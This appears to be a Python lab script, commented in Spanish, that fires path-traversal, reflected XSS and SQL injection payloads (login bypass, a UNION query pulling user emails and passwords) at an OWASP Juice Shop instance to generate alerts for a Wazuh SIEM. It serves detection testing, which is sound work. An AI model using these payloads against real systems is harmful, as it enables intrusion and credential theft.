# attack_simulator.py
# Simulador de ataques web contra el nodo victima (OWASP Juice Shop).
# Lanza vectores LFI, XSS reflejado y SQLi para generar telemetria que el SIEM
# (Wazuh) debe detectar. Confinado al laboratorio aislado.

import datetime
import os
import sys
import time

import requests

# Tiempo maximo (segundos) que espera cada peticion HTTP antes de fallar.
REQUEST_TIMEOUT = 10
# Tiempo maximo esperando a que la victima este disponible (HTTP 200).
READINESS_TIMEOUT = 300
# Pausa tras confirmar disponibilidad, para que el SIEM asiente sus buffers.
STABILIZATION_DELAY = 10
# Identificador del agente en las peticiones (facilita el analisis de logs).
USER_AGENT = "tfg-adversary-simulator/1.0"

# Payloads de Local File Inclusion / Path Traversal: intentan escapar del
# directorio raiz del servidor para leer ficheros del sistema.
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "../../../../etc/passwd%00",
    "../../../../etc/shadow",
]

# Payloads de XSS reflejado: distintas representaciones para eludir filtros.
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<iframe src=\"javascript:alert(`xss`)\">",
    "<img src=x onerror=alert('xss')>",
    "\"><svg/onload=alert('xss')>",
]

# Payloads de SQLi para el buscador: desde provocar error hasta exfiltrar datos.
SQLI_SEARCH_PAYLOADS = [
    "'",
    "' OR 1=1--",
    "qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--",
]

# Payloads de SQLi para el login: bypass de autenticacion.
SQLI_LOGIN_PAYLOADS = [
    "' OR 1=1--",
    "admin' OR '1'='1",
    "' OR '1'='1'--",
    "'--",
]


def log(message):
    # Imprime un mensaje con marca de tiempo UTC y fuerza el vaciado del buffer
    # para que la traza aparezca en tiempo real en el log de cloud-init.
    timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    print(f"[attack_simulator] {timestamp} {message}", flush=True)


def resolve_target():
    # Obtiene la IP objetivo de la variable de entorno TARGET_IP o, en su
    # defecto, del primer argumento de linea de comandos. Aborta si no hay IP.
    target = os.environ.get("TARGET_IP")
    if not target and len(sys.argv) > 1:
        target = sys.argv[1]
    if not target:
        log("ERROR: no se ha proporcionado la IP objetivo (TARGET_IP o argv[1])")
        sys.exit(1)
    return target.strip()


def wait_for_target(session, base_url):
    # Sondea la victima hasta recibir HTTP 200 o agotar READINESS_TIMEOUT.
    # Captura RequestException (cubre Timeout y ConnectionError) para reintentar.
    deadline = time.time() + READINESS_TIMEOUT
    while time.time() < deadline:
        try:
            response = session.get(base_url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                return True
        except requests.exceptions.RequestException as exc:
            log(f"objetivo aun no disponible: {exc}")
        time.sleep(3)
    return False


def run_lfi(session, base_url):
    # Envia cada payload LFI como parametro GET 'file'. requests construye la
    # query string y aplica el URL-encoding automaticamente.
    log("iniciando vector LFI / Path Traversal")
    for payload in LFI_PAYLOADS:
        try:
            response = session.get(
                f"{base_url}/",
                params={"file": payload},
                timeout=REQUEST_TIMEOUT,
            )
            log(f"LFI payload={payload!r} status={response.status_code}")
        except requests.exceptions.RequestException as exc:
            log(f"LFI payload={payload!r} error={exc}")


def run_xss(session, base_url):
    # Envia cada payload XSS al buscador de productos (parametro GET 'q'),
    # endpoint que refleja la entrada del usuario.
    log("iniciando vector XSS reflejado")
    for payload in XSS_PAYLOADS:
        try:
            response = session.get(
                f"{base_url}/rest/products/search",
                params={"q": payload},
                timeout=REQUEST_TIMEOUT,
            )
            log(f"XSS payload={payload!r} status={response.status_code}")
        except requests.exceptions.RequestException as exc:
            log(f"XSS payload={payload!r} error={exc}")


def run_sqli(session, base_url):
    # Primera fase: SQLi por el buscador (GET), donde 'q' se concatena en la
    # consulta SQLite subyacente.
    log("iniciando vector SQLi (search)")
    for payload in SQLI_SEARCH_PAYLOADS:
        try:
            response = session.get(
                f"{base_url}/rest/products/search",
                params={"q": payload},
                timeout=REQUEST_TIMEOUT,
            )
            log(f"SQLi-search payload={payload!r} status={response.status_code}")
        except requests.exceptions.RequestException as exc:
            log(f"SQLi-search payload={payload!r} error={exc}")

    # Segunda fase: SQLi por el login (POST). El parametro json= serializa el
    # cuerpo y fija la cabecera Content-Type: application/json. El payload en
    # 'email' busca convertir la condicion en siempre verdadera (bypass).
    log("iniciando vector SQLi (login bypass)")
    for payload in SQLI_LOGIN_PAYLOADS:
        try:
            response = session.post(
                f"{base_url}/rest/user/login",
                json={"email": payload, "password": "password123"},
                timeout=REQUEST_TIMEOUT,
            )
            log(f"SQLi-login payload={payload!r} status={response.status_code}")
        except requests.exceptions.RequestException as exc:
            log(f"SQLi-login payload={payload!r} error={exc}")


def main():
    # Resuelve el objetivo y construye la URL base.
    target = resolve_target()
    base_url = f"http://{target}"
    log(f"objetivo establecido en {base_url}")

    # Session reutiliza la conexion TCP y aplica el User-Agent a cada peticion.
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})

    # No ataca hasta confirmar que la victima responde.
    if not wait_for_target(session, base_url):
        log(f"ERROR: el objetivo {base_url} no respondio HTTP 200 en {READINESS_TIMEOUT}s")
        sys.exit(2)

    log(f"objetivo disponible; pausa de estabilizacion ({STABILIZATION_DELAY}s)")
    time.sleep(STABILIZATION_DELAY)

    # Ejecuta los tres vectores en secuencia.
    run_lfi(session, base_url)
    run_xss(session, base_url)
    run_sqli(session, base_url)

    log("suite de ataque completada")


# Punto de entrada: solo se ejecuta si el fichero se lanza directamente.
if __name__ == "__main__":
    main()
